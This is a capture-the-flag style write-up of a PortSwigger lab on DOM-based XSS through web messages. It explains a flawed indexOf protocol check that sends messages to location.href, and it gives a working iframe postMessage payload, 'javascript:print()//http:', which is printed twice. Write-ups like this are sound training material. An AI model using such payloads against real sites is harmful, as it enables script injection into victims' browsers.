# Lab: DOM XSS using web messages and a JavaScript URL (Practitioner)

**Lab:** [https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)

**Task (from PortSwigger):**  
This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

## Vulnerability
Event listener checks for `"http:"` or `"https:"` with a flawed `indexOf`, then assigns the message to `location.href`. A `javascript:` URL that also contains `http:` bypasses the check.

## Solution

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

### Steps
1. Confirm the listener and the weak protocol check.
2. Send `javascript:print()//http:` so the check passes and the sink executes the payload.
3. Deliver to the victim.

## Final Exploit Payload
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
